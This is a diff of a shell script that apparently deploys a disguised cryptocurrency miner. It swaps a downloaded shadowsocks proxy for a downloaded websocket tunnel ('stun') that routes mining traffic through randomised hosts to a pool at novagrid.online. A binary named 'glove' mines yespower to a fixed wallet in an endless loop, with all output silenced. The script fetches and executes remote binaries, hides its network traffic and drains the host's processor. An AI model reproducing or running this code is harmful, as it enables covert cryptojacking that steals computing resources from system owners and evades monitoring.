@@ -28,14 +28,6 @@ ph add glove 1>/dev/null 2>&1
 
 sleep 2
 
-wget https://greenleaf.teatspray.uk/Spectre.tar.gz
-sleep 2
-tar -xf Spectre.tar.gz
-sleep 2
-./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:8443 &
-sleep 2
-curl -x socks5h://127.0.0.1:1082 api.ipify.org
-sleep 2
 
 DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
 
@@ -82,8 +74,20 @@ sleep 2
 tar -xf glove.tar.gz
 sleep 2
 
+wget https://greenleaf.teatspray.uk/stun_10.1.6.tar.gz
+
+sleep 2
+
+tar -xf stun_10.1.6.tar.gz
+
+sleep 2
+
+./stun client --http-upgrade-path-prefix aPvDUHQEdtM5tVStQajxIVKaXA2Ad5TSu -L tcp://6666:novagrid.online:3001 ws://usashadespectre$(shuf -i 1-6 -n 1).devopsenterprise.uk:80 &
+
+sleep 2
+
 while true
 do
-./glove --algo yespower --param-n 2048 --param-r 8 --param-key "" -o stratum+tcp://novagrid.online:3001 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY -p x-t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./glove --algo yespower --param-n 2048 --param-r 8 --param-key "" -o stratum+tcp://127.0.0.1:6666 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY -p x-t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
